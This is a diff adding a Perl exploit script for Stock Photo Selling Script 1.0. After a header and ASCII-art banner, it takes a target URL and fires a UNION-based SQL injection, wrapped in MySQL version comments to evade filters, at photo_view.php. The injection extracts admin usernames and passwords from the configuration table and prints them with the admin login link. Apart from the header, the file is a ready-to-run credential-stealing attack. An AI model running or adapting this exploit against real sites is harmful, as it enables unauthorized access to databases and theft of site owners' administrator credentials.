@@ -1,0 +1,59 @@
+#!/usr/bin/perl -w
+# # # # # 
+# Exploit Title: Stock Photo Selling Script 1.0 - SQL Injection
+# Dork: N/A
+# Date: 21.09.2017
+# Vendor Homepage: http://sixthlife.net/
+# Software Link: http://sixthlife.net/product/stock-photo-selling-website/
+# Demo: http://www.photoreels.com/
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+sub clear{
+system(($^O eq 'MSWin32') ? 'cls' : 'clear'); }
+clear();
+print "
+################################################################################
+                   #### ##     ##  ######     ###    ##    ## 
+                    ##  ##     ## ##    ##   ## ##   ###   ## 
+                    ##  ##     ## ##        ##   ##  ####  ## 
+                    ##  #########  ######  ##     ## ## ## ## 
+                    ##  ##     ##       ## ######### ##  #### 
+                    ##  ##     ## ##    ## ##     ## ##   ### 
+                   #### ##     ##  ######  ##     ## ##    ## 
+
+             ######  ######## ##    ##  ######     ###    ##    ## 
+            ##    ## ##       ###   ## ##    ##   ## ##   ###   ## 
+            ##       ##       ####  ## ##        ##   ##  ####  ## 
+             ######  ######   ## ## ## ##       ##     ## ## ## ## 
+                  ## ##       ##  #### ##       ######### ##  #### 
+            ##    ## ##       ##   ### ##    ## ##     ## ##   ### 
+             ######  ######## ##    ##  ######  ##     ## ##    ##                                                                            
+                 Stock Photo Selling Script 1.0 - SQL Injection           
+################################################################################
+";
+use LWP::UserAgent;
+print "\nInsert Target:[http://site.com/path/]: ";
+chomp(my $target=<STDIN>);
+print "\n[!] Exploiting Progress.....\n";
+print "\n";
+$tt="tbl_configurations";
+$cc="(/*!00007SELECT*/%20GROUP_CONCAT(0x3c74657874617265613e,0x557365726e616d653a,admin_name,0x2020202020,0x50617373776f72643a,admin_password,0x3c2f74657874617265613e%20SEPARATOR%200x3c62723e)%20/*!00007FROM*/%20".$tt.")";
+$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
+$b->agent('Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0');
+$host = $target . "photo_view.php?photo_sid=-d1fe173d08e959397adf34b1d77e88d7'%20%20/*!00007UNION*/(/*!00007SELECT*/%200x283129,0x283229,0x283329,".$cc.",0x283529,0x283629,0x283729,0x283829,0x283929,0x28313029,0x28313129,0x28313229,0x28313329,0x28313429,0x28313529,0x28313629,0x28313729,0x28313829,0x28313929,0x28323029,0x28323129,0x28323229,0x28323329,0x28323429,0x28323529,0x28323629,0x28323729,0x28323829,0x28323929,0x28333029,0x28333129,0x28333229,0x28333329,0x28333429,0x28333529,0x28333629,0x28333729,0x28333829,0x28333929,0x28343029,0x28343129,0x28343229,0x28343329,0x28343429,0x28343529,0x28343629)--%20-";
+$res = $b->request(HTTP::Request->new(GET=>$host));
+$answer = $res->content; if ($answer =~/<textarea>(.*?)<\/textarea>/){
+print "[+] Success !!!\n";
+print "\n[+] Admin Detail : $1\n";
+print "\n[+]$target/admin/index.php?mod=login\n";
+print "\n";
+}
+else{print "\n[-]Not found.\n";
+}
